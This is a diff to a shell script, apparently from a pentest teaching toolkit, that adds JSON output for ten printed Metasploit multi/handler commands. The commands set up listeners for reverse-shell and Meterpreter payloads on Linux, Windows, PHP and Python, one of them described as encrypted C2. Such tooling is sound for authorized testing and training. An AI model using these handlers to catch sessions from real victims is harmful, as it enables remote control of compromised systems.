@@ -29,6 +29,8 @@ require_cmd msfconsole "https://docs.metasploit.com/docs/using-metasploit/gettin
 LHOST="${1:-$(ipconfig getifaddr en0 2>/dev/null || echo '10.0.0.1')}"
 LPORT="${2:-4444}"
 
+json_set_meta "metasploit" "$LHOST" "exploitation"
+
 confirm_execute
 safety_banner
 
@@ -54,51 +56,73 @@ echo ""
 info "1) Linux Meterpreter handler"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 echo ""
+json_add_example "1) Linux Meterpreter handler" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 
 # 2. Windows Meterpreter handler
 info "2) Windows Meterpreter handler"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 echo ""
+json_add_example "2) Windows Meterpreter handler" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 
 # 3. PHP Meterpreter handler
 info "3) PHP Meterpreter handler"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 echo ""
+json_add_example "3) PHP Meterpreter handler" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 
 # 4. Generic shell handler
 info "4) Basic shell handler (works with any OS)"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 echo ""
+json_add_example "4) Basic shell handler (works with any OS)" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 
 # 5. Python handler
 info "5) Python handler"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 echo ""
+json_add_example "5) Python handler" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
 
 # 6. Handler with auto-run scripts
 info "6) Handler with auto-run scripts"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set AutoRunScript post/windows/manage/migrate; run\""
 echo ""
+json_add_example "6) Handler with auto-run scripts" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set AutoRunScript post/windows/manage/migrate; run\""
 
 # 7. Background job handler
 info "7) Multi-handler as background job"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set ExitOnSession false; exploit -j\""
 echo ""
+json_add_example "7) Multi-handler as background job" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set ExitOnSession false; exploit -j\""
 
 # 8. Resource script
 info "8) Create a resource script file"
 echo "   echo -e \"use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST ${LHOST}\nset LPORT ${LPORT}\nrun\" > handler.rc && msfconsole -r handler.rc"
 echo ""
+json_add_example "8) Create a resource script file" \
+    "echo -e \"use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST ${LHOST}\nset LPORT ${LPORT}\nrun\" > handler.rc && msfconsole -r handler.rc"
 
 # 9. HTTPS handler
 info "9) HTTPS handler for encrypted C2"
 echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ${LHOST}; set LPORT 443; run\""
 echo ""
+json_add_example "9) HTTPS handler for encrypted C2" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ${LHOST}; set LPORT 443; run\""
 
 # 10. Handler with session logging
 info "10) Handler with session logging"
 echo "    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set SessionCommunicationTimeout 0; set ExitOnSession false; exploit -j\""
 echo ""
+json_add_example "10) Handler with session logging" \
+    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set SessionCommunicationTimeout 0; set ExitOnSession false; exploit -j\""
+
+json_finalize
 
 # Interactive demo (skip if non-interactive)
 if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
